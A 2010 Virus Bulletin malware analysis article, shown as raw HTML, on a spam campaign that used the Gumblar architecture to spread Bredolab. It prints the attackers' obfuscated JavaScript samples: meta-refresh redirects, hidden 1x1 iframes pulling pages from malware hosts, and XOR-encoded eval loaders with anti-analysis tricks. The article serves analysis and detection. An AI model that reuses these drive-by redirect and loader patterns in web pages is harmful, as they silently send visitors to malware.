<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: It's just spam, it can't hurt, right?</title>
<meta name="description" content="One nice summerâ€™s day, emails started flooding into Gabor Szappanos's mailbox with a spam-like message and a suspicious-looking attachment. The messages promised news on the latest FIFA World Cup scandal, so he took a look. In fact, the messages were not only distributing spam, but also members of the Bredolab family, and were doing so using the infamous Gumblar distribution architecture. Gabor describes the working of the attack." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 2216;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201010-just-spam"></a>It&#39;s just spam, it can&#39;t hurt, right?</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2010-10-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Gabor</span> <span class="surname">Szappanos</span></h3><span class="orgname">VirusBuster</span>, <span class="orgdiv">Hungary</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>One nice summer&rsquo;s day, emails started flooding into Gabor Szappanos&#39;s mailbox with a spam-like message and a suspicious-looking attachment. The messages promised news on the latest FIFA World Cup scandal, so he took a look. In fact, the messages were not only distributing spam, but also members of the Bredolab family, and were doing so using the infamous Gumblar distribution architecture. Gabor describes the working of the attack.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2010 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-3876" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-3876" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3996083"></a></span></dt><dt><span class="sect1"><a href="#id3743620">Message bodies</a></span></dt><dt><span class="sect1"><a href="#id3332483">Methods used</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4320067">refresh</a></span></dt><dt><span class="sect2"><a href="#id2952509">refresh_enc</a></span></dt><dt><span class="sect2"><a href="#id2302589">refresh_mal</a></span></dt><dt><span class="sect2"><a href="#id3964268">plainurl</a></span></dt><dt><span class="sect2"><a href="#id3074237">var_loc</a></span></dt><dt><span class="sect2"><a href="#id4857897">replace</a></span></dt><dt><span class="sect2"><a href="#id2647742">replace_ind</a></span></dt><dt><span class="sect2"><a href="#id3978459">repl_dual</a></span></dt><dt><span class="sect2"><a href="#id2721779">xor</a></span></dt><dt><span class="sect2"><a href="#id3644654">xor_adv</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id3656774">Attack stages in detail</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4629592">Stage 1: email</a></span></dt><dt><span class="sect2"><a href="#id3617897">Stage 2: dispatcher</a></span></dt><dt><span class="sect2"><a href="#id4125022">Stage 3: attack selector</a></span></dt><dt><span class="sect2"><a href="#id3668212">Stage 4a: PDF</a></span></dt><dt><span class="sect2"><a href="#id2924603">Stage 4b: HTML</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id3352690">Where do you want to go today?</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3996083"></a></h2></div></div></div><p>It all began on a nice summer&rsquo;s day. Emails started flooding into my mailbox with a spam-like message and a suspicious-looking attachment. The same messages were also captured in our spam traps. The messages promised news on the latest FIFA World Cup scandal, and as a soccer fan I was curious, so I took a closer look.</p><p>Having been in this business for a few years, I was not surprised to see a spam campaign riding on the back of the latest news event. On the contrary, I would have been surprised not to have seen any.</p><p>The attachment led to a redirected page, which turned out to be a pharma spam message. So it seemed that it wasn&rsquo;t too dangerous, &lsquo;just&rsquo; spam. But the means of reaching this spam was far more complicated than can reasonably be justified, leading me to believe that it couldn&rsquo;t be that simple &ndash; and, as it turned out, it wasn&rsquo;t.</p><p>In fact, the messages were not only distributing spam, but also members of the infamous Bredolab family. To do all of this, the even more infamous Gumblar distribution architecture was used.</p><p>There are already some excellent descriptions of the Gumblar architecture and distribution methods [<span class="citation"><a href="#citation.1">1</a></span>], [<span class="citation"><a href="#citation.2">2</a></span>], [<span class="citation"><a href="#citation.3">3</a></span>] so I will focus instead on the intermediate steps leading to the final system compromise. I will attempt to make clear the working of the attack, point out the role of each building block during the process, and even give a few tips on the analysis of these scripts.</p><p>The activities of the group behind this attack were observed over a period of one month, using email messages collected in multiple spam traps. I am quite sure that more distribution sites were involved in the attack than are described here, but I will enumerate only those that I could connect with certainty to the group &ndash; either using the same distribution sites or using similar methods.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3743620"></a>Message bodies</h2></div></div></div><p>The bait on the hook &ndash; the spam messages &ndash; covered a wide range of common lures: account suspension notifications, <em class="productname">Facebook</em>/<em class="productname">Skype</em> password reset requests, the promise of interesting photos, new private messages received, new e-card received, and so on. In the early days, messages promised news of the FIFA World Cup scandal as well as something that&rsquo;s never missing from a large-scale seeding: the promise of pornographic content in the attachment.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3332483"></a>Methods used</h2></div></div></div><p>Over the observation period, several activation methods were observed, which are documented in this section. The beginning of the campaign was dominated by the simple replace method, and the end by the more complicated xor and xor_adv, while the plainurl method appeared at various points throughout the campaign. The rest of the methods were used only occasionally and inconsistently.</p><p>At the very beginning of the timeline there was a massive seeding, which was followed by a more moderate seeding with continuously changing distribution methods. <a href="#figure.1">Figure 1</a> illustrates the different methods used over time. The rare ones, that were used only once (repl_ind, var_loc, refresh_mal) have been omitted to make the chart clearer.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Distribution methods." src="/uploads/images/figures/2010/10/Szapi-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Distribution methods.</b></p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4320067"></a>refresh</h3></div></div></div><p>In this method the malicious code is attached to the message (as a base64-encoded attachment), and the message body attempts to persuade recipients to open it.</p><p>The attached code is a simple HTML refresh tag, usually with the first-stage dual distribution page as a target:</p><pre class="programlisting">&lt;meta http-equiv=&rdquo;refresh&rdquo; content=&rdquo;0;url=http://miphillylatino.com/index3.html&rdquo; /&gt;</pre></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2952509"></a>refresh_enc</h3></div></div></div><p>This method was used only once during the observation period (on 15 July), but in reasonably large number. It is essentially the same as the refresh method, the only enhancement being the URL encoding used on top of the refresh tag, in the form:</p><pre class="programlisting">&lt;script type=&rdquo;text/javascript&rdquo;&gt;
&lt;!-- HTML encodyd --&gt;
&lt;!--
document.write(unescape(&lsquo;%3C%6D%65%74%61%20%68%74%74%70%...%20%2F%3E%0A&rsquo;));
//--&gt;
&lt;/script&gt;</pre><p>The typo (&lsquo;encodyd&rsquo;) is courtesy of the malware author.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2302589"></a>refresh_mal</h3></div></div></div><p>This method was used in a single case, at the end of the timeline on 22 July.</p><p>The attachment is the same script (structurally) as the one that was downloaded in most cases as the second-stage dispatcher:</p><pre class="programlisting">PLEASE WAITING...
&lt;meta http-equiv=&rdquo;refresh&rdquo; content=&rdquo;4;url=http://knewname.com&rdquo; /&gt;
&lt;iframe src=&rsquo;http://bellday.ru:8080/index.php?pid=10&rsquo; width=&rsquo;1&rsquo; height=&rsquo;1&rsquo; 
style=&rsquo;visibility: hidden;&rsquo;&gt;&lt;/iframe&gt;</pre><p>Despite consisting of only two words, the message is grammatically poor, suggesting that the author is not extremely proficient in English.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3964268"></a>plainurl</h3></div></div></div><p>It doesn&rsquo;t get simpler than this: the message body itself contains the hyperlink to the first-stage distribution page, embedded into the body text:</p><pre class="programlisting">&lt;p style=3D&rdquo;margin-top:5px;font-size:10px;color:#888888;&rdquo;&gt;
If you received this message in error and did not sign up for a Twitt= 
er account, click &lt;a href=3D&rsquo;http://jimjewell.com/z.htm&rsquo;&gt;not my account&lt;/a&gt;.
&lt;/p&gt; </pre></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3074237"></a>var_loc</h3></div></div></div><p>Established as a very simple code in the base64 attachment, this method was in use for just two days (14 and 15 July), in between far more complicated methods, for no obvious reason.</p><pre class="programlisting">&lt;script language=&rsquo;javascript&rsquo;&gt;
var1=49;
var2=var1;
if(var1==var2) document.location=&rdquo;http://www.i-dda.com/index3.html&rdquo;;
&lt;/script&gt;</pre></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4857897"></a>replace</h3></div></div></div><p>Here, the active code is in a base64 attachment, with an enticing message body to lure the reader into opening it.</p><p>If we reduce the code to its basics, it sets document.location.href to the distribution page. But it does so in an unusual way, by defining a function class, and referencing the &lsquo;constructor&rsquo; of the class:</p><pre class="programlisting">&lt;script type=&rsquo;text/javascript&rsquo;&gt;
function mD(){};
mD.prototype = {
     creator : function() {
           var a=&rsquo;http://mvblaw.com/z.htm&rsquo;;
           var iD=document[&lsquo;location&rsquo;];
           iD[&lsquo;href&rsquo;]=a;
           }
     };
var b=new mD(); b.creator();
&lt;/script&gt;</pre><p>One of the common tricks used in this family is to refer to object methods in the form document[&lsquo;location&rsquo;] instead of the more conventional document.location. The advantage of this approach is that, being a string constant, the replace trick could be used on the &lsquo;location&rsquo;, thus making analysis and detection more complicated:</p><pre class="programlisting">document[&lsquo;l.oSc&lt;a(t&lt;i_oSnS&rsquo;.replace(/[S_\&lt;\(\.]/g, &lsquo;&rsquo;)];</pre><p>The string constants (&lsquo;location&rsquo;, &lsquo;href&rsquo; and the URL) are used in a replace construct, which could be more sophisticated, but in this case one random character is inserted after each character in the string (the &lsquo;random&rsquo; characters are carefully selected to avoid using any that appear in the string), and these are replaced to an empty string, as follows:</p><pre class="programlisting">var a=&rsquo;hgt,t&lt;pG:&lt;/&lt;/gm,vgb&lt;lGaGwg.GcGogmG/gzG.GhGtGmg&rsquo;.replace(/[gJG,\&lt;]/g, &lsquo;&rsquo;);</pre><p>Furthermore, random junk do-nothing variable assignments are inserted into the code. Typical junk assignment types are the following:</p><pre class="programlisting">this.aB=43719;
var w=new Date();
this.j=&rsquo;&rsquo;;
var x=function(){};
y=&rdquo;&rdquo;;</pre><p>To extract the URL used by the malware, the junk instructions must be removed. This is made easy by the fact that the random variables in these instructions are never referred to again in the code. Here, a token-highlighting text editor, like <em class="productname">Notepad++</em>, could prove handy, easily revealing the scope of a variable.</p><p>After that the replace instructions are resolved by removing the junk characters in the strings. Once the first sample of this kind had been analysed, a shortcut was possible. It was easy to find the garbled URL replace construct in the code (by finding the .replace instruction), then by concentrating on that single instruction it was easy to extract the URL. Even better, thanks to the shortcomings of the string obfuscation algorithm, one could almost blindly remove every second character to reach to the destination point.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2647742"></a>replace_ind</h3></div></div></div><p>This method was used on only one day, 23 June.</p><p>Basically it is the same as the replace method, but uses more sophisticated obfuscation with additional junk codes and even simple fake code constructs:</p><pre class="programlisting">var lA=function(){return &lsquo;lA&rsquo;}
var t=false;
var i=new Array();</pre><p>The schematics of the code show more advanced coding (error handling, wrapping replace to a function call):</p><pre class="programlisting">&lt;script type=&rsquo;text/javascript&rsquo;&gt;
function main(){};
main.prototype = {construct : function() {
   var _document=document;
   var _window=window;
   try {
     window.onload=function() {
        rT=_document[&lsquo;location&rsquo;];
        rT[&lsquo;href&rsquo;]=&rsquo;http://myhometourgallery.com/xxx.html&rsquo;
     };
   } 
   catch(aA) {
     _document.write(&lsquo;&lt;html &gt;&lt;head &gt;&lt;/head&gt;&lt;body &gt;&lt;/body&gt;&lt;/html&gt;&rsquo;);
     var k = this;
     _window[&lsquo;setTimeout&rsquo;](function(){ k.construct();}, 232);
   }
};
var xCG=new main(); xCG.construct();
&lt;/script&gt;</pre><p>In case the document.location.href method fails, an error handler retries it some time later (and, just to be safe, clears the content to an empty document).</p><p>Extracting the target URLs was only slightly more complicated than it was for the replace method. Instead of searching for .replace, one could look for the garbled URL. Whatever code generator the malware authors used, it had inserted a single garbage character after each character of the protected string. This made the URL easy to spot (e.g. by searching for the &lsquo;h.t.t.p.:././&rsquo; regexp either by using a script or visually).</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3978459"></a>repl_dual</h3></div></div></div><p>This method appeared surprisingly early in the timeline, and was only used on a couple of occasions. In fact, it was the earliest observed delivery method, which included access to the first-stage spam-malware landing pages. Around a day later, another delivery layer was added to this multi-stage attack, and access to the spam and malware landing page was pushed one layer further.</p><pre class="programlisting">&lt;script type=&rsquo;text/javascript&rsquo;&gt;
function main(){};
main.prototype = {
  url : function() {return &lsquo;http://sonnose.ru:8080/index.php?pid=10&rsquo;;},
  construct : function() {
   var _window=window;
   var _document=document;
   try {
     var iframeobj=document[&lsquo;createElement&rsquo;](&lsquo;iframe&rsquo;);
     iframeobj[&lsquo;setAttribute&rsquo;](&lsquo;src&rsquo;, this.url());
     iframeobj[&lsquo;setAttribute&rsquo;](&lsquo;height&rsquo;, &ldquo;1&rdquo;);
     iframeobj[&lsquo;setAttribute&rsquo;](&lsquo;width&rsquo;, &ldquo;1&rdquo;);
     _document[&lsquo;body&rsquo;][&lsquo;appendChild&rsquo;](iframeobj);
   } 
   catch(aU) {
     _document[&lsquo;write&rsquo;](&lsquo;&lt;html &gt;&lt;body &gt;&lt;/body&gt;&lt;/html&gt;&rsquo;);
     _window[&lsquo;setTimeout&rsquo;](function(){ this.construct() }, 319);
   }
  }
};
var newobj=new main(); newobj.construct();
&lt;/script&gt;
&lt;script type=&rsquo;text/javascript&rsquo;&gt;
function main(){};main.prototype = {
  construct : function() {
   function _url(m, v){m.href=v;}
   n=document[&lsquo;location&rsquo;];
   _url(n, &lsquo;http://toldspeak.com&rsquo;);
  }
};
var f=new main(); f.construct();
&lt;/script&gt;</pre><p>Despite its early appearance, the code is more complex than its successors. Two script tags are present, the first for referring to the malware distribution page, opening it in a 1x1 pixel iframe, and the second for the spam distribution page. The junk instructions inserted into the code are the same as for the repl_ind method.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2721779"></a>xor</h3></div></div></div><p>This was the first of the activation methods to cause me a headache. Messages utilizing this method appeared on 1 July. An easily locatable URL was no longer present in the script. Being the lazy analyst that I am, I didn&rsquo;t start dissecting the code and wasting precious hours. Instead, looking for clues, the first thing I spotted was a long string at the beginning of the code:</p><pre class="programlisting">sF=&rsquo;f3f0fcf&rsquo;+&rsquo;eebf6f0&rsquo;+&rsquo;f1b1f7e&rsquo;+&rsquo;dfaf9bf&rsquo;+&rsquo;a2bfb8f&rsquo;+&rsquo;7<span class="bold"><strong>ebeb</strong></span>ef&rsquo;+&rsquo;a5<span class="bold"><strong>b0b0</strong></span>e&rsquo;+&rsquo;8f7f6eb&rsquo;+&rsquo;fef4fae&rsquo;
+&rsquo;df2fafb&rsquo;+&rsquo;f6fcfef&rsquo;+&rsquo;3b1fcf0&rsquo;+&rsquo;f2b0f6f&rsquo;+&rsquo;1fbfae7&rsquo;+&rsquo;acb1f7e&rsquo;+&rsquo;bf2f3b8&rsquo;+&rsquo;a4&rsquo;;</pre><p>Clearly, it had to be a hex string, which I hoped contained the URL in some construct.</p><p>Another clue that I found was an xor inside the code:</p><pre class="programlisting">return m^bI;</pre><p>So to make my life easier, I assumed that the URL was stored as a static xor-encoded string. Only the key was in question, which was acquired using a known-plaintext attack. The URL should contain &lsquo;http://&rsquo;, with two repeating bytes (t and /) near each other. In the encrypted string this pattern appeared only once (eb and b0), therefore we had 0x74-&gt;0xeb and 0x2f-&gt;0xb0 transformations. Fortunately, both led to the same xor key, 0x9f. Applying this key to the string led to the text:</p><pre class="programlisting">location.href = &lsquo;http://whitakermedical.com/index3.html&rsquo;;</pre><p>Later on, I dissected the code further. It turned out that I had been lucky with the shortcut I found &ndash; had I tried to analyse the code in the traditional way, I would have stepped onto various landmines, placed in the code to make analysis more complicated.</p><p>The code was full of junk instructions. Apart from the one already listed, new elements occurred which were more complicated and realistic constructs:</p><pre class="programlisting">var oK;if(oK == &lsquo;fIF&rsquo;){oK=0;};
var mU;if(mU!=&rsquo;&rsquo; &amp;&amp; mU!=&rsquo;uHN&rsquo;){mU=null};
var yU = Math.ceil(47);
var nC = Math.random();</pre><p>Not only that, but the string obfuscation (discussed in the replace section) moved one step further. This time, instead of replace constructs, all sorts of (and even mixed) escape constructs were used, resulting in representations such as [&lsquo;\u0067\u0065\u0074&rsquo;+unescape(&lsquo;%53%65%63%6f%6e%64%73&rsquo;)] for [&lsquo;getSeconds&rsquo;]. Fortunately, a tool like Malzilla can make the deobfuscation of these strings easier.</p><p>The cleaned up code has the following scheme:</p><pre class="programlisting">&lt;script&gt;
var url;
url=&rsquo;f3f0fcfeebf6f0f1b1f7edfaf9bfa2bfb8f7ebebefa5b0b0e8f7f6ebfef4faedf2fafbf6fcfef3b1fc
f0f2b0f6f1fbfae7acb1f7ebf2f3b8a4&rsquo;;
function main(encrypted_url){
   var date_act = new Date();  
   <span class="bold"><strong>var sec_act = (date_act[&lsquo;getHours&rsquo;]()*3594)+(date_act[&lsquo;getMinutes&rsquo;]()*58)+date_act
   [&lsquo;getSeconds&rsquo;]();
   var w = sec_act - sec_start;</strong></span>
   if(w &lt; 0) w = 1;
   if(w &gt; 1) w = 1;
   var b = document;  //unused 
   var pH = &lsquo;&rsquo;;
   for(var i=0; i &lt; encrypted_url[&lsquo;length&rsquo;]; i+=2){
    pH+= &lsquo;%&rsquo; + encrypted_url[&lsquo;substr&rsquo;](i, 2);}
   var encrypted_url = window[&lsquo;unescape&rsquo;](pH);
   var decrypted_url = &lsquo;&rsquo;;
   for(var j=0; j &lt; encrypted_url[&lsquo;length&rsquo;]; j++){
    var nextchar = encrypted_url.charCodeAt(j);
    <span class="bold"><strong>nextchar = nextchar ^ (158 + w);</strong></span>
    decrypted_url+=String[&lsquo;fromCharCode&rsquo;](nextchar);
    }
   window[&lsquo;eval&rsquo;](decrypted_url);
   return decrypted_url;
   }
var date_start = new Date();
<span class="bold"><strong>var sec_start = (date_start[&lsquo;getHours&rsquo;]()*3594)+(date_start[&lsquo;getMinutes&rsquo;]()*58)+
date_start[&lsquo;getSeconds&rsquo;](); </strong></span>
setTimeout(&lsquo;main(url)&rsquo;, 1030);
&lt;/script&gt;</pre><p>So, the malicious URL is opened via location.href, which is activated from a setTimeOut activation. The timeout value is about one second in each of the observed cases.</p><p>The time is queried at the beginning of the code, and then again after the timeout period has expired (about 1s). If the time difference between the two is 0 (in seconds), then the xor key for decoding will be 0x9e (a bogus value); in any other case it is the correct 0x9f. If the code is modified for easier analysis by replacing the timeout with a direct call, or reducing its length, then the garbage string will be decoded instead of the URL.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3644654"></a>xor_adv</h3></div></div></div><p>At first sight, this script looked just like the xor case, even the encrypted string could be spotted, and the xor operation was also there, but the string itself did not show the pattern of repeating bytes &ndash; a clear indication that a more complex encryption (based on xor) had been used.</p><p>Fast forwarding and skipping the painful operation of cleaning and simplifying the code, the end result was this:</p><pre class="programlisting">var string_to_decode;
string_to_decode=&rsquo;b1abb8b2bab2b4baf299ad85a0fbfde7cfaeaeb7a2dff3e8b9ababa1adb9a6aea0b0
bab482acb9a99eb3b5f5aaa2bde8a1bab3a683f1e7b8b8abb7e7f9&rsquo;;
var xor_key=130;
function main(encoded_string){
function string_checksum(t){
     var l=0;
     for(var i=2;i&lt;t.length+2;i++){
           f=t.charCodeAt(i-2);
           l=l+f*t.length;
           }
     return new String(l);
     }
     
function init_object(obj, z){
     if(u_glob == null) {u_glob = {};}
     if(u_glob[obj] == null) {
           u_glob[obj] = new Object();
           u_glob[obj].index = 0;
           u_glob[obj].strval = z;}
     }
function next_objindex(obj) {
     if(u_glob[obj] != null) {
           var zV = u_glob[obj];
           var objindex = zV.index;
           var eZ = zV.strval;
           var b = eZ.substr(objindex, 1);
           if(objindex + 1 &lt; eZ.length) {zV.index = objindex + 1;} 
     else {zV.index = 0;}
     return b.charCodeAt( 0);
     }     
}
var u_glob = null;var _String=String;
<span class="bold"><strong>var function_body = new String(lJ);</strong></span>
var c = &lsquo;&rsquo;;
var zZ = &lsquo;&rsquo;;
var j=0;
while(j &lt; encoded_string.length){
     zZ+= &ldquo;%&rdquo; + encoded_string.substr(j, 2);
     j+=2;
     }
var encoded_string = unescape(zZ);
var normalized_body = function_body.replace(/[^@a-z0-9A-Z_-]/g, &ldquo;&rdquo;);
var checksum = new String(string_checksum(normalized_body));
init_object(&lsquo;normalized_body&rsquo;, normalized_body);
init_object(&lsquo;checksum&rsquo;, checksum);
var lM=0;
while(lM &lt; 10000) {
     var i = encoded_string.charCodeAt(lM);
     if(isNaN(i)) break;
             <span class="bold"><strong>i = i ^ xor_key;
             i = i ^ next_objindex(&lsquo;checksum&rsquo;);
             i = i ^ next_objindex(&lsquo;normalized_body&rsquo;);</strong></span>
     c=c+String.fromCharCode(i);
     lM++;}
window[&lsquo;eval&rsquo;](c);
};
main(string_to_decode);
<span class="bold"><strong>function lJ(nU)</strong></span>{var sR=&rsquo;&rsquo;;var gU=&rsquo;&rsquo;;function y(f){var fL=new Array(); &hellip; var fEM = 
Math.ceil(18);var yU=new Date();}</pre><p>In short, apart from the static key, each byte of the encoded string is xor-ed with a circularly indexed byte from the normalized full function body (white spaces are removed), and the string representation of a checksum calculated over this normalized body. Obviously, the circular indexing only has an effect on the latter, as the normalized body is much longer than the encrypted string.</p><p>What I found interesting was this piece of code:</p><pre class="programlisting">var h = new String(document.write);
if(h[indexOf](&lsquo;arity&rsquo;) != -1) { return 130;}</pre><p>It is located in the function which returns the xor key. It has no effect, as later in the code it will return the same value regardless. This must be the remainder of some intermediate development stage, but its exact meaning is not clear. Nevertheless, it is not the only case where debug instructions were left in the code.</p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3656774"></a>Attack stages in detail</h2></div></div></div><p>Although there were some exceptional cases, the vast majority of attacks followed the stages described in <a href="#figure.2">Figure 2</a>, which shows the actual addresses used in one of the analysed cases (which were dead at the time of writing this article).</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="General attack scheme." src="/uploads/images/figures/2010/10/Szapi-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;General attack scheme.</b></p></div><p>The attack progresses in many stages, starting with replaceable, short-lived pages, and going via redirections to longer lifetime spam and a malware landing page. During the observed period, the intermediate pages changed a few times, while the landing pages had lifetimes measurable in days.</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4629592"></a>Stage 1: email</h3></div></div></div><p>The first stage is always an email. We will consider the most common case.</p><p>The email contains a link to a dispatcher HTML page, with dual distribution content using one of the methods described in the previous section (except repl_dual).</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3617897"></a>Stage 2: dispatcher</h3></div></div></div><p>The second stage is of the same form, with the spam landing page being open via HTTP refresh. The intermediate malware distribution page is opened via a hidden iframe:</p><pre class="programlisting">&lt;meta http-equiv=&rdquo;refresh&rdquo; content=&rdquo;3;url=http://mouseultra.com/&rdquo; /&gt;
